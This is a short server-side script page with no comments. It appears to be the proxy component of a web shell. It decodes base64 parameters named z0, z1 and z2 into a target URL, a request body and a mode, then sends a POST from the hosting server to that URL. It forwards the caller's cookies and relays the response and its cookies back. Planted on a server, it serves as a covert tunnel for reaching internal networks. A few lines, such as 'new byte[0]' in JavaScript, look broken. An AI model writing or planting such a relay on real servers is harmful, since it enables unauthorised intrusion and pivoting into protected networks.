<%
(function() {

    response.setContentType("text/plain");
    response.setCharacterEncoding("UTF-8");

    function base64_decode(str) {
        if (!str) return "";
        try {
            var decoder = java.util.Base64.getDecoder();
            var decodedBytes = decoder.decode(str);
            return new java.lang.String(decodedBytes, "UTF-8");
        } catch (e) {
            return "";
        }
    }

    function base64_decode_bytes(str) {
        if (!str) return new byte[0];
        try {
            var decoder = java.util.Base64.getDecoder();
            return decoder.decode(str);
        } catch (e) {
            return new byte[0];
        }
    }

    function base64_encode(bytes) {
        try {
            var encoder = java.util.Base64.getEncoder();
            return encoder.encodeToString(bytes);
        } catch (e) {
            return "";
        }
    }

    function send_http_request(urlStr, method, postData, mode, cookies) {
        var result = { http_code: 0, body: "" };
        try {
            var url = new java.net.URL(urlStr);
            var conn = url.openConnection();
            
            conn.setRequestMethod(method);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setInstanceFollowRedirects(true); 

            if (cookies) {
                conn.setRequestProperty("Cookie", cookies);
            }

            var postBytes;
            if (mode === "binary") {
                conn.setRequestProperty("Content-Type", "application/octet-stream");
                postBytes = base64_decode_bytes(postData);
            } else {
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                postBytes = postData ? new java.lang.String(postData).getBytes("UTF-8") : new byte[0];
            }

            if (method === "POST") {
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Length", String(postBytes.length));
                
                var os = conn.getOutputStream();
                os.write(postBytes);
                os.flush();
                os.close();
            }

            result.http_code = conn.getResponseCode();

            // Handle Set-Cookie headers from response
            var headerFields = conn.getHeaderFields();
            if (headerFields != null) {
                var setCookieList = headerFields.get("Set-Cookie");
                if (setCookieList != null) {
                    for (var i = 0; i < setCookieList.size(); i++) {
                        var cookieVal = setCookieList.get(i);
                        response.addHeader("Set-Cookie", cookieVal);
                    }
                }
            }

            var is = (result.http_code >= 200 && result.http_code < 400) ? conn.getInputStream() : conn.getErrorStream();
            if (is != null) {
                if (mode === "binary") {
                    var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 4096);
                    var bytesOut = new java.io.ByteArrayOutputStream();
                    var read;
                    while ((read = is.read(buffer)) != -1) {
                        bytesOut.write(buffer, 0, read);
                    }
                    is.close();
                    result.body = base64_encode(bytesOut.toByteArray());
                } else {
                    var reader = new java.io.BufferedReader(new java.io.InputStreamReader(is, "UTF-8"));
                    var line;
                    var responseBuffer = new java.lang.StringBuilder();
                    while ((line = reader.readLine()) != null) {
                        responseBuffer.append(line).append("\n");
                    }
                    reader.close();
                    result.body = responseBuffer.toString();
                }
            }
        } catch (e) {
            result.body = e.toString();
        }
        return result;
    }

    var url = base64_decode(request.getParameter("z0"));
    var data = base64_decode(request.getParameter("z1"));
    var mode = base64_decode(request.getParameter("z2"));
    
    var cookies = "";
    var cookieHeader = request.getHeader("Cookie");
    if (cookieHeader != null) {
        cookies = cookieHeader;
    }

    if (!url) {
        return; 
    }

    var res = send_http_request(url, "POST", data, mode, cookies);
    if (typeof echo === 'function') {
        echo(res.body);
    } else {
        out.print(res.body);
    }

    return;
})();
%>